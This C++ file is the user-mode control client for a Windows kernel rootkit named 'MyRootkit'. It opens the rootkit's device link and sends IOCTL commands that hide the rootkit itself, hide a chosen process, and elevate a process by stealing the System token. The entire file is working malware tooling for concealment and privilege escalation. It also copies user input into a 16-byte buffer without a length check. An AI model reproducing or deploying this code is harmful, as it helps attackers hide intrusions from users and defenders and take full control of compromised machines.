#include <cstdlib>
#include <iostream>
#include <windows.h>
#include <wchar.h>
#include <winioctl.h>

#define SIOCTL_TYPE 40000
#define IOCTL_HIDE_PROCESS CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_HIDE_ROOTKIT CTL_CODE(SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_ELEVATION_PROCESS CTL_CODE(SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define MAX_PROCESS_LEN 16

void usage()
{
     printf("\n      **** MyRootkit ****\n" \
            "-r                           Hide the rootkit\n" \
            "-p <process_name> || <pid>   Hide a process\n" \
            "-e <process_name> || <pid>   Process privilege elevation\n");
}

int main(int argc, char **argv)
{
    HANDLE hDevice = NULL;  
    DWORD NombreByte = 0;
    OVERLAPPED o;
    char out[50]= "";
    char process[MAX_PROCESS_LEN ] = "";
    int i = 0;

    /* Init */
    ZeroMemory(&o, sizeof(out));
    ZeroMemory(out, sizeof(out));

    /* Create device */    
    hDevice = CreateFile("\\\\.\\myLinkToMyRootkit", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == ((HANDLE)-1)) 
    {
       printf("error : unable to open the device\n");
       return FALSE;
    }
    
    /* Options parser */
    usage();
    if (argc < 2)
       goto exit;
    for (i = 1; i < argc; i++)
    {
        /* Hide the rootkit */
        if (!strcmp("-r", argv[i]))
        {
            DeviceIoControl(hDevice, IOCTL_HIDE_ROOTKIT, NULL, 0, out, sizeof(out), &NombreByte, NULL);
            continue;
        }
		else
		{
			/* Hide the given process */
			if ((i < argc - 1) && !strcmp("-p", argv[i]))
			{
				memset(process, 0, MAX_PROCESS_LEN);
				i++;
				memcpy(process, argv[i], strlen(argv[i]));
				DeviceIoControl(hDevice, IOCTL_HIDE_PROCESS, process, strlen(process), out, sizeof(out), &NombreByte, NULL);
			}
			else
            {
				/* Steal the token of the process "System" for the given process */        
				if ((i < argc - 1) && !strcmp("-e", argv[i]))
				{
					memset(process, 0, MAX_PROCESS_LEN);
					i++;
					memcpy(process, argv[i], strlen(argv[i]));
					DeviceIoControl(hDevice, IOCTL_ELEVATION_PROCESS, process, strlen(process), out, sizeof(out), &NombreByte, NULL);
				}
				else
				{
					/* Invalid option */
					printf("error : invalid option\n"); 
					goto exit;
				}
			}
		}
    }
    
    /* Display output from kernel-land */
    printf("message : %s\n", out);
    
exit:    
    /* Close device */
    CloseHandle(hDevice);
    
    return EXIT_SUCCESS;
}
